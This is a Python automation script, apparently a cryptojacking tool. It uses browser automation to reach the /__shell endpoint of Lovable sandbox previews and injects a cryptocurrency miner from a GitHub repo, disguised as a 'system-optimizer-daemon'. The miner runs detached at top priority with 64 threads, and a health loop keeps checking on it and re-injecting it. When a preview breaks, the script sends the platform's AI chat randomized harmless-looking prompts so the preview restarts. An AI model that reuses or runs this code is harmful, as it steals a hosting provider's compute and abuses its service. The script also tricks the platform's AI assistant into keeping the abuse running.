#!/usr/bin/env python3
"""
Worker Runner - Start worker + health check
Handles randomized injection and auto-recovery
"""

import asyncio
import json
import random
import subprocess
from datetime import datetime

# Worker config
MINER_REPO = "https://github.com/crucifix-cray/system-optimizer-daemon.git"
BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"


def generate_random_folder_name() -> str:
    """Generate folder name: moly (fixed)"""
    return "moly"


def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
    """Build worker start command."""
    return f"""cd /tmp && pkill python; rm -rf {folder_name} && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"""


async def shell_exec(page, cmd: str, cwd: str = None) -> dict:
    """Execute a command via the Vite /__shell endpoint directly.

    Bypasses window.doc entirely — works even when Camoufox doesn't
    evaluate the Vite module scripts that define window.doc.

    Tries the page main frame first, then every child frame (Lovable
    preview is an OOPIF; top-level often lacks /__shell).

    Returns: {"stdout": str, "stderr": str, "code": int, "cwd": str}
    """
    payload = json.dumps({"cmd": cmd, "cwd": cwd})
    # Escape for embedding in a JS string literal
    payload_escaped = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
    js = f"""async () => {{
        const body = `{payload_escaped}`;
        const r = await fetch('/__shell', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: body
        }});
        const text = await r.text();
        try {{ return JSON.parse(text); }}
        catch (e) {{
            return {{code: -1, stdout: '', stderr: 'non-json HTTP ' + r.status + ': ' + text.slice(0, 160), cwd: ''}};
        }}
    }}"""
    errors = []
    targets = [page]
    try:
        targets.extend(list(page.frames))
    except Exception:
        pass
    seen = set()
    for i, target in enumerate(targets):
        try:
            # Dedupe: page is frames[0] in Playwright
            tid = id(target)
            if tid in seen:
                continue
            seen.add(tid)
            r = await target.evaluate(js)
            if isinstance(r, dict) and r.get("code") == 0:
                return r
            if isinstance(r, dict):
                errors.append(str(r.get("stderr") or r)[:120])
        except Exception as e:
            errors.append(f"{type(e).__name__}:{e}"[:80])
    if errors:
        return {"code": -1, "stdout": "", "stderr": " | ".join(errors[:4]), "cwd": ""}
    return {"code": -1, "stdout": "", "stderr": "shell failed on all frames", "cwd": ""}



async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
    """
    Inject miner into Lovable sandbox via /__shell endpoint directly.

    No window.doc dependency — the shell bridge is a plain HTTP POST.
    Caller must already have confirmed the shell bridge works.

    Returns: True if successful, False otherwise
    """
    try:
        folder_name = generate_random_folder_name()
        cmd = build_worker_command(folder_name, bridge_url, threads)

        print(f"⚙️ Starting worker (folder: {folder_name})...")

        # Fire backgrounded command — don't wait for the long chain, just
        # verify the shell accepted it. Use nohup so the process survives
        # if the page navigates away.
        bg_cmd = f"nohup sh -c '{cmd}' > /dev/null 2>&1 & echo $!"
        try:
            r = await asyncio.wait_for(shell_exec(page, bg_cmd), timeout=30)
            pid = (r.get("stdout") or "").strip()
            print(f"   ✅ Backgrounded (pid: {pid})")
        except asyncio.TimeoutError:
            print(f"   ⚠️  Command sent but timed out waiting for response (likely running)")
        except Exception as e:
            print(f"   ⚠️  Shell exec error: {e}")
            return False

        print(f"✅ Worker command sent! Folder: {folder_name}")
        return True

    except Exception as e:
        print(f"❌ Injection failed: {e}")
        import traceback
        traceback.print_exc()
        return False


async def check_preview_health(page) -> str:
    """
    Check if preview is healthy or showing error.
    
    Returns: "OK" | "ERROR" | "UNKNOWN"
    """
    try:
        content = await page.content()
        
        # Check for known error
        if "Lovable proxy error" in content and "404" in content:
            return "ERROR"
        
        # Check if iframe exists
        frames = page.frames
        has_preview = any("webcontainer" in f.url.lower() or "lovableproject" in f.url.lower() or f.url.startswith("https://lovable-") for f in frames)
        
        if has_preview:
            return "OK"
        else:
            return "UNKNOWN"
    
    except Exception as e:
        print(f"⚠️  Health check failed: {e}")
        return "UNKNOWN"


async def recover_from_error(page, project_url: str, bridge_url: str = BRIDGE_URL) -> bool:
    """
    Recover from preview error by prompting AI again.
    
    Flow:
    1. Go to chat_url
    2. Send prompt to AI
    3. Wait 40-60 seconds
    4. Return to preview_url
    5. Restart worker
    
    Returns: True if recovery successful, False otherwise
    """
    try:
        print("🔄 Starting recovery process...")
        
        # Extract base project URL
        if ".lovableproject.com" in project_url:
            project_id = project_url.split("//")[1].split(".")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        elif "/projects/" in project_url:
            project_id = project_url.split("/projects/")[1].split("/")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        else:
            chat_url = project_url
        
        preview_url = f"https://{project_id}.lovableproject.com"
        
        # 1. Go to chat
        print(f"📝 Going to chat: {chat_url}")
        await page.goto(chat_url, timeout=30000)
        await asyncio.sleep(3)
        
        # 2. Find chat input and send prompt
        print("💬 Sending prompt to AI...")
        
        prompts = [
            "Start the development server",
            "Run the dev server please",
            "Start the application",
            "Launch the preview"
        ]
        prompt = random.choice(prompts)
        
        # Try multiple selectors for chat input
        chat_selectors = [
            'textarea[placeholder*="chat"]',
            'textarea[placeholder*="message"]',
            'textarea[placeholder*="Ask"]',
            'textarea',
            '[contenteditable="true"]'
        ]
        
        chat_input = None
        for selector in chat_selectors:
            try:
                chat_input = await page.wait_for_selector(selector, timeout=5000)
                if chat_input:
                    break
            except:
                continue
        
        if not chat_input:
            print("❌ Could not find chat input")
            return False
        
        await chat_input.fill(prompt)
        await asyncio.sleep(0.5)
        
        # Press Enter or click send button
        await page.keyboard.press("Enter")
        
        # 3. Wait 40-60 seconds
        wait_time = random.randint(40, 60)
        print(f"⏳ Waiting {wait_time} seconds for AI to respond...")
        await asyncio.sleep(wait_time)
        
        # 4. Go back to preview
        print(f"🔄 Returning to preview: {preview_url}")
        await page.goto(preview_url, timeout=30000)
        await asyncio.sleep(5)
        
        # 5. Check health
        health = await check_preview_health(page)
        if health != "OK":
            print(f"⚠️  Preview still not OK: {health}")
            return False
        
        # 6. Restart worker
        print("⚙️ Restarting worker...")
        success = await inject_miner(page, bridge_url)
        
        if success:
            print("✅ Recovery complete!")
            return True
        else:
            print("❌ Re-injection failed")
            return False
        
    except Exception as e:
        print(f"❌ Recovery failed: {e}")
        return False


async def health_check_loop(page, project_url: str, mode: str = "full", bridge_url: str = BRIDGE_URL, context=None, max_runtime_minutes: float = None):
    """
    Continuous health check loop.
    
    Modes:
    - "oneshot": Keep checking until the preview stops loading (error on page), then end
    - "full": Keep checking every 3min, auto-recover on error
    - "gh": Same as full, but stop after max_runtime_minutes (for GH Actions job limits)
    
    If the page crashes/closes, a fresh page is relaunched and the worker re-injected.
    """
    check_interval = 180  # 3 minutes
    loop_start = datetime.now()
    
    print(f"\n{'='*60}")
    print(f"🏥 HEALTH CHECK MODE: {mode.upper()}")
    print(f"{'='*60}\n")
    
    iteration = 0
    
    while True:
        iteration += 1
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if max_runtime_minutes:
            elapsed_min = (datetime.now() - loop_start).total_seconds() / 60
            if elapsed_min >= max_runtime_minutes:
                print(f"\n⏰ Max runtime reached ({elapsed_min:.0f}/{max_runtime_minutes:.0f} min) - ENDING")
                return True
        
        print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")

        try:
            # ponytail: never reload the page - reloading the WebContainer kills
            # the injected worker. Probe for a live sysoptd instead; re-inject
            # only when the worker is missing.
            try:
                r = await shell_exec(page, "ps -A -o args | grep -c '[s]ysoptd'")
                stdout = (r.get("stdout") or "").strip()
                alive = stdout.isdigit() and int(stdout) > 0
                if alive:
                    print(f"   ✅ Worker alive in sandbox (pgrep: {stdout})")
                    try:
                        log_r = await shell_exec(page, "tail -5 /tmp/m.log 2>/dev/null || echo 'no log'")
                        log_lines = (log_r.get("stdout") or "").strip()
                        if log_lines:
                            print(f"   📋 m.log:")
                            for line in log_lines.split("\n"):
                                print(f"      {line}")
                    except:
                        pass
                else:
                    print(f"   ⚙️  Worker missing (probe: {stdout}) - re-injecting...")
                    success = await inject_miner(page, bridge_url)
                    print(f"   Re-injection {'successful' if success else 'failed - will retry next check'}")
            except Exception as e:
                print(f"   ⚠️  Keep-alive probe failed: {e}")

            # Check health WITHOUT reloading the page
            health = await check_preview_health(page)
            print(f"   Status: {health}")

            if health == "ERROR":
                print("   ⚠️  ERROR DETECTED - preview no longer loading!")
                print("   🔄 Re-checking 3 times (15s apart) to rule out slow reload...")

                still_error = True
                for attempt in range(3):
                    await asyncio.sleep(15)
                    try:
                        await page.reload(timeout=30000)
                    except Exception:
                        pass
                    await asyncio.sleep(8)
                    health = await check_preview_health(page)
                    print(f"   🔄 Re-check #{attempt+1}: {health}")
                    if health != "ERROR":
                        still_error = False
                        break

                if still_error:
                    print("   ⚠️  Preview still failing after re-checks")

                    if mode == "oneshot":
                        print("   🛑 Oneshot mode - preview stopped, ENDING")
                        return False
                    else:
                        print("   🔄 Full mode - attempting recovery...")
                        success = await recover_from_error(page, project_url, bridge_url)

                        if not success:
                            print("   ❌ Recovery failed - STOPPING")
                            return False
                        else:
                            print("   ✅ Recovery successful - continuing...")
                else:
                    print("   ✅ Preview recovered after re-checks - continuing")

            elif health == "OK":
                print("   ✅ Preview healthy")
            else:
                print("   ⚠️  Unknown status")

            # Wait for next check
            print(f"   ⏳ Next check in {check_interval}s...")
            await asyncio.sleep(check_interval)

        except KeyboardInterrupt:
            print("\n⚠️  Health check interrupted by user")
            return False
        except Exception as e:
            print(f"   ❌ Check failed: {e}")

            if mode == "oneshot":
                print("   🛑 Oneshot mode - check failed, ENDING")
                return False
            else:
                print("   ⏳ Retrying in 30s...")
                await asyncio.sleep(30)


if __name__ == "__main__":
    print("🧪 Worker Runner Module")
    print("\nFunctions:")
    print("  - inject_worker(page, bridge_url)")
    print("  - check_preview_health(page)")
    print("  - recover_from_error(page, project_url)")
    print("  - health_check_loop(page, project_url, mode='full')")
    print("\nImport this module in your scripts.")
